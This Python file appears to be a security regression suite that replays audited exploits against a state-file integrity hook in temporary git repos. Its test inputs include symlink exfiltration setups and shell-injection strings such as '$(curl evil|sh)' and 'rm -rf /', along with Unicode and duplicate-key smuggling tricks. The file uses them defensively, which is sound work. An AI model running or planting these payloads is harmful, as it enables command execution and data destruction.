#!/usr/bin/env python3
"""S61 security regression suite (kit/hooks/tests). Standalone: `python3 kit/hooks/tests/test_state_integrity_security.py`. Pins every PROVEN exploit
from the S61 security-auditor + 2 adversarial bypass-hunt rounds.

Original note: Re-runs each PROVEN exploit from the
security-auditor against the PATCHED state_integrity.py in an isolated temp git
repo. Exit 0 = all closed; nonzero = a regression is live."""

import importlib.util
import os
import subprocess
import sys
import tempfile
from pathlib import Path

# repo-relative: kit/ mirror is the versioned source of truth (S57)
LIB = Path(__file__).resolve().parents[1] / "lib" / "state_integrity.py"
spec = importlib.util.spec_from_file_location("state_integrity", LIB)
si = importlib.util.module_from_spec(spec)
spec.loader.exec_module(si)

VALID_FM = (
    "---\n"
    "title: t\ntype: state\nupdated: 2026-07-02\nsprint: 61\n"
    "phase: 7-sync\nbranch: feature/x\ntag: v0.1.0-alpha.60\n"
    "last_task_sha: {sha}\n---\n\n## body\n"
)

results = []


def check(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"{'PASS' if ok else 'FAIL'}  {name}" + (f"  — {detail}" if detail else ""))


def make_repo():
    d = Path(tempfile.mkdtemp(prefix="si_exploit_"))
    state = d / "llm-wiki" / "wiki" / "project" / "SPRINT_STATE.md"
    bdir = d / "llm-wiki" / "wiki" / "project" / "state" / ".backup"
    bdir.mkdir(parents=True)
    state.parent.mkdir(parents=True, exist_ok=True)
    env = {
        **os.environ,
        "GIT_AUTHOR_NAME": "t",
        "GIT_AUTHOR_EMAIL": "t@t",
        "GIT_COMMITTER_NAME": "t",
        "GIT_COMMITTER_EMAIL": "t@t",
    }
    subprocess.run(["git", "init", "-q", str(d)], check=True, env=env)
    state.write_text(VALID_FM.format(sha="0000000"), encoding="utf-8")
    subprocess.run(["git", "-C", str(d), "add", "-A"], check=True, env=env)
    subprocess.run(["git", "-C", str(d), "commit", "-qm", "init"], check=True, env=env)
    head = subprocess.run(
        ["git", "-C", str(d), "rev-parse", "--short", "HEAD"],
        capture_output=True,
        text=True,
        env=env,
    ).stdout.strip()
    return d, state, bdir, head, env


def run_main(repo):
    old = sys.argv
    sys.argv = ["state_integrity.py", str(repo)]
    try:
        si.main()
    finally:
        sys.argv = old


# ── BLOCKER #1: symlink-follow exfil ────────────────────────────────────────
d, state, bdir, head, env = make_repo()
secret = d / "SECRET_TARGET"
secret.write_text("SUPERSECRET-ghp_deadbeefcafe\n", encoding="utf-8")
os.symlink(secret, bdir / "SPRINT_STATE.zzz99.md")  # malicious symlink backup
state.write_text("CORRUPT no frontmatter\n", encoding="utf-8")  # trigger restore
run_main(d)
after = state.read_text(encoding="utf-8", errors="replace")
check(
    "BLOCKER#1 symlink-exfil blocked",
    "SUPERSECRET" not in after,
    "secret NOT copied into state" if "SUPERSECRET" not in after else "LEAKED",
)

# ── HIGH #2: blind restore of structurally-invalid (forged) backup ──────────
d, state, bdir, head, env = make_repo()
# forged backup: invalid phase → must NOT be installed; only backup present
(bdir / "SPRINT_STATE.20260101-000000.md").write_text(
    VALID_FM.format(sha=head).replace("phase: 7-sync", "phase: 99-FORGED"), encoding="utf-8"
)
state.write_text("CORRUPT\n", encoding="utf-8")
run_main(d)
after = state.read_text(encoding="utf-8", errors="replace")
check(
    "HIGH#2 invalid backup not installed",
    "99-FORGED" not in after and "CORRUPT" in after,
    "state left visibly corrupt, forged phase not installed",
)

# ── HIGH #2b: newest invalid, older valid → walks to valid ──────────────────
d, state, bdir, head, env = make_repo()
(bdir / "SPRINT_STATE.20260101-000000.md").write_text(
    VALID_FM.format(sha=head), encoding="utf-8"
)  # older VALID
inv = bdir / "SPRINT_STATE.20260201-000000.md"
inv.write_text(
    VALID_FM.format(sha=head).replace("branch: feature/x", "branch:"), encoding="utf-8"
)  # newer INVALID (empty branch)
os.utime(inv, (9e9, 9e9))  # make newer by mtime
state.write_text("CORRUPT\n", encoding="utf-8")
run_main(d)
after = state.read_text(encoding="utf-8", errors="replace")
check(
    "HIGH#2b walks past invalid to valid backup",
    "sprint: 61" in after and "branch: feature/x" in after,
    "installed the older valid one",
)

# ── HIGH #3: poison last_task_sha rejected by validate ──────────────────────
poisons = ["$(curl evil|sh)", "a87deec ; rm -rf /", "`id`", "a87deec$(evil)"]
allrej = all(
    any("last_task_sha" in p for p in si.validate(VALID_FM.format(sha=x))) for x in poisons
)
check(
    "HIGH#3 poison last_task_sha rejected", allrej, "all 4 shell-injection payloads flagged corrupt"
)
# clean sha passes
clean_ok = not any("last_task_sha" in p for p in si.validate(VALID_FM.format(sha=head)))
check("HIGH#3b clean sha still valid", clean_ok)

# ── MEDIUM #4: sticky lexicographic poison → mtime wins ─────────────────────
d, state, bdir, head, env = make_repo()
real = bdir / "SPRINT_STATE.20260702-120000.md"
real.write_text(
    VALID_FM.format(sha=head).replace("tag: v0.1.0-alpha.60", "tag: REALBK"), encoding="utf-8"
)
os.utime(real, (9e9, 9e9))  # newest mtime
sticky = bdir / "SPRINT_STATE.99999999-999999.md"  # lexicographically-highest
sticky.write_text(
    VALID_FM.format(sha=head).replace("tag: v0.1.0-alpha.60", "tag: STICKY"), encoding="utf-8"
)
os.utime(sticky, (1e9, 1e9))  # oldest mtime
picked = si.safe_backups(bdir)[0].name
check("MEDIUM#4 mtime beats lexicographic sticky-poison", picked == real.name, f"picked {picked}")

# ── ARCH HIGH#1: non-ancestor sha → STALE ───────────────────────────────────
d, state, bdir, head, env = make_repo()
stale_bk = VALID_FM.format(sha="deadbee")  # valid-hex but not in repo
check("ARCH#1 non-ancestor sha flagged stale", si.stale_restore(d, stale_bk) is True)
check("ARCH#1b real HEAD sha NOT stale", si.stale_restore(d, VALID_FM.format(sha=head)) is False)

# ── BYPASS-HUNT HIGH: parser-differential last_task_sha (#-comment + unicode) ──
diff_payloads = [
    "deadbeef1234#$(curl -s evil.sh|sh)",  # no-space # (not YAML comment)
    "deadbeef1234\x0cpayload",  # form-feed splitlines
    "deadbeef1234\x85payload",  # NEL splitlines
    "deadbeef1234\u2028payload",  # LINE SEP splitlines
]
alldiff = all(
    any("last_task_sha" in p or "control" in p for p in si.validate(VALID_FM.format(sha=x)))
    for x in diff_payloads
)
check(
    "BYPASS HIGH parser-differential rejected",
    alldiff,
    "#-comment + form-feed/NEL/LINE-SEP all flagged",
)
# legit space-# comment still passes
legit = not si.validate(
    VALID_FM.format(sha=head).replace(
        f"last_task_sha: {head}", f"last_task_sha: {head}  # HEAD comment"
    )
)
check("BYPASS HIGHb legit space-# comment still valid", legit)

# ── BYPASS-HUNT BLOCKER: destination symlink not followed on write ──────────
d, state, bdir, head, env = make_repo()
outside = d / "OUTSIDE_TARGET"
outside.write_text("ORIGINAL-untouched\n", encoding="utf-8")
state.unlink()
os.symlink(outside, state)  # state IS a symlink out of tree
(bdir / "SPRINT_STATE.20260101-000000.md").write_text(VALID_FM.format(sha=head), encoding="utf-8")
run_main(d)
check(
    "BYPASS BLOCKER dest-symlink not followed",
    outside.read_text().startswith("ORIGINAL"),
    "out-of-tree target NOT overwritten",
)

# ── LOW#6: control chars sanitized in problem output ────────────────────────
esc = VALID_FM.format(sha=head).replace("phase: 7-sync", "phase: \x1b[31mX")
probs = si.validate(esc)
check(
    "LOW#6 terminal-escape sanitized", all("\x1b" not in p for p in probs), "no raw ESC in problems"
)

# ── ROUND2 MEDIUM: duplicate-key smuggling (first-wins validate vs last-wins) ──
dup = (
    "---\nsprint: 61\nphase: 7-sync\nbranch: feature/x\n"
    "last_task_sha: deadbeef1234\nlast_task_sha: $(curl evil.sh|sh)\n---\n\n## body\n"
)
check(
    "ROUND2 dup last_task_sha rejected",
    any("дубль" in p for p in si.validate(dup)),
    "duplicate key flagged",
)
dupph = (
    "---\nsprint: 61\nphase: 4-execution\nphase: 6-review\n"
    f"branch: feature/x\nlast_task_sha: {head}\n---\n\n## body\n"
)
check(
    "ROUND2 dup phase rejected (merge-guard disarm)", any("дубль" in p for p in si.validate(dupph))
)

# ── ROUND3: indented/space-colon key smuggling (strict flat-line enforcement) ──
_pre = "---\nsprint: 61\nphase: 7-sync\nbranch: feature/x\n"
r3 = {
    "leading-space dup": _pre
    + "last_task_sha: deadbeef1234\n last_task_sha: $(curl evil|sh)\n---\n\nb\n",
    "tab-indent dup": _pre + "last_task_sha: deadbeef1234\n\tlast_task_sha: $(p)\n---\n\nb\n",
    "space-before-colon": _pre + "last_task_sha : deadbeef1234\n---\n\nb\n",
}
for label, txt in r3.items():
    check(f"ROUND3 {label} rejected", bool(si.validate(txt)))
# real flat key: value with # comment still valid
ok_comment = _pre + f"last_task_sha: {head}  # HEAD последней задачи\n---\n\nb\n"
check("ROUND3 flat key:value + #comment still valid", not si.validate(ok_comment))

# ── ROUND3 HIGH: non-ASCII whitespace on phase disarms shell gates ──────────
# Python .strip()/\s treats these as space (validate sees clean '4'); shell
# [[:space:]] is ASCII-only (case [2-8] sees '4<ws>' → no match → gate fails open).
for name, ws in [
    ("NBSP", " "),
    ("U+2000", " "),
    ("U+202F", " "),
    ("U+205F", " "),
    ("U+3000", "　"),
    ("U+1680", " "),
]:
    poisoned = (
        "---\nsprint: 61\nbranch: feature/x\n" f"last_task_sha: {head}\nphase: 4{ws}\n---\n\nb\n"
    )
    check(f"ROUND3 non-ASCII ws ({name}) on phase rejected", bool(si.validate(poisoned)))

# ── ROUND4: zero-width (isspace=False) on gate-consumed branch/sprint rejected ──
for name, o in [("ZWSP", 0x200B), ("BOM", 0xFEFF), ("WJ", 0x2060), ("SHY", 0x00AD)]:
    zwc = chr(o)
    tb = (
        f"---\nsprint: 61\nphase: 4-execution\nbranch: feature/x{zwc}\n"
        f"last_task_sha: {head}\n---\n\nb\n"
    )
    check(f"ROUND4 zero-width ({name}) on branch rejected", bool(si.validate(tb)))
tsp = (
    f"---\nsprint: 6{chr(0x200B)}1\nphase: 4-execution\nbranch: feature/x\n"
    f"last_task_sha: {head}\n---\n\nb\n"
)
check("ROUND4 zero-width in sprint rejected", bool(si.validate(tsp)))
# legit ASCII branch still valid
check(
    "ROUND4 legit ASCII branch valid",
    not si.validate(
        f"---\nsprint: 61\nphase: 4-execution\n"
        f"branch: feature/sprint-61-state-v2\nlast_task_sha: {head}\n---\n\nb\n"
    ),
)

# ── ROUND2 MEDIUM: log symlink not followed ─────────────────────────────────
d, state, bdir, head, env = make_repo()
logtarget = d / "LOG_TARGET"
logtarget.write_text("ORIGINAL-log\n", encoding="utf-8")
logpath = bdir / "integrity.log"
if logpath.exists():
    logpath.unlink()
os.symlink(logtarget, logpath)  # integrity.log IS a symlink out
state.write_text("CORRUPT\n", encoding="utf-8")  # force a log() call
(bdir / "SPRINT_STATE.20260101-000000.md").write_text(VALID_FM.format(sha=head), encoding="utf-8")
run_main(d)
check(
    "ROUND2 log-symlink not followed",
    logtarget.read_text() == "ORIGINAL-log\n",
    "out-of-tree log target untouched",
)

# ── ROUND2 MEDIUM: newline-named backup excluded from candidates ────────────
d2, state2, bdir2, head2, env2 = make_repo()
try:
    nlname = bdir2 / "SPRINT_STATE.aa\ncurl evil #.md"
    nlname.write_text(VALID_FM.format(sha=head2), encoding="utf-8")
    picked = [p.name for p in si.safe_backups(bdir2)]
    check(
        "ROUND2 newline-named backup excluded",
        all("\n" not in n for n in picked),
        f"candidates={picked}",
    )
except OSError:
    check("ROUND2 newline-named backup excluded", True, "FS rejected newline name (ok)")

print("\n" + "=" * 50)
failed = [n for n, ok, _ in results if not ok]
print(f"{len(results) - len(failed)}/{len(results)} PASS")
sys.exit(1 if failed else 0)
